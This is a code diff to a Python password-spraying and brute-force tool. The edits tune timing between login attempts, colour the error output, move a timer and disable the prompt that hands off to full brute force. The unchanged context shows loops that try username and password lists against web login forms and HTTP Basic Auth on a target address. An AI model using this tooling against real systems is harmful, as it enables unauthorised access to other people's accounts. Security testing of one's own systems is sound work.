@@ -391,7 +391,7 @@ def generate_password_variants(password):
     
     return variants
 
-def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=2):
+def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=1):
     """
     Performs brute force attempts on login forms or BasicAuth with a time delay between each attempt.
 
@@ -553,7 +553,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     pages_to_check = list(set(pages_to_check))  # Remove duplicates
 
     
-    start_timer()
+    #start_timer()
     log_resource_usage("Initial Connection","")
     total_pages_field = 0 # stores the total number of pages that have any authentication fields
     for page in pages_to_check:        
@@ -580,12 +580,15 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                         else:
                             failed_cracks.append((full_url, username, password))
                     except (Timeout, ConnectionError):
-                        print(f"Connection failed for {full_url}")
+                        print(f"{Fore.RED}Connection failed for {full_url}")
+                        time.sleep(1)
                     except RequestException as e:
-                        print(f"An error occurred: {e}")
-                #time.sleep(2)
+                        print(f"{Fore.RED}An error occurred: {e}")
+                        time.sleep(1)
+                    #time.sleep(1)
 
         if is_password_requested_basic_auth(full_url, session):
+            start_timer()
             total_pages_field +=1
             for password in passwords:
                 for username in usernames:
@@ -599,31 +602,38 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                             successful_attempts = successful_attempts +1
                             break
                         else:
+                            '''
                             # Print a more detailed error reason based on the response code
-                        #    if response.status_code == 401:
-                        #        print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
-                        #    elif response.status_code == 403:
-                        #        print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
-                        #    else:
-                        #        print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}") #// Can be useful when debugging
-
+                            if response.status_code == 401:
+                                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
+                            elif response.status_code == 403:
+                                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
+                            else:
+                                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}") #// Can be useful when debugging
+                            '''
                             failed_cracks.append((full_url, username, password))
 
                     except (Timeout, ConnectionError):
-                        print(f"Connection failed for {full_url}")
+                        print(f"{Fore.RED}Connection failed for {full_url}")
+                        time.sleep(1)
                     except RequestException as e:
-                        print(f"An error occurred: {e}")
-    duration = end_timer()
+                        print(f"{Fore.RED}An error occurred: {e}")
+                        time.sleep(1)
+            duration = end_timer()
+    # duration = end_timer()
             
     # After exhausting all combinations, ask if the user wants to proceed with bruteforce
-    if ask_for_bruteforce():
-        perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
+    #if ask_for_bruteforce():
+        #perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
 
-
-    #if failed_cracks:
-    #    print(f"{Fore.RED}Failed pages that required a password:")
-    #    for page, user, pwd in failed_cracks:
-    #        print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
+    '''
+    if failed_cracks:
+        print(f"{Fore.RED}Failed pages that required a password:")
+        for page, user, pwd in failed_cracks:
+            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
+    '''
+    if failed_cracks: ### if uncommenting the code above when debugging, make sure to comment this if statement (not the else)
+        pass
     else:
         print(f"{Fore.GREEN}No failed password cracking attempts.")
     
@@ -648,7 +658,6 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     print(f"{Fore.YELLOW}\n--- Resource Utilization ---{Style.RESET_ALL}")
     for i, (phase, memory) in enumerate(memory_usage_per_phase):
         memory = memory_usage_per_phase[i][1]  # Access the corresponding memory usage
-
         print(f"{Fore.CYAN}{phase} - Memory: {memory}%")
 
 
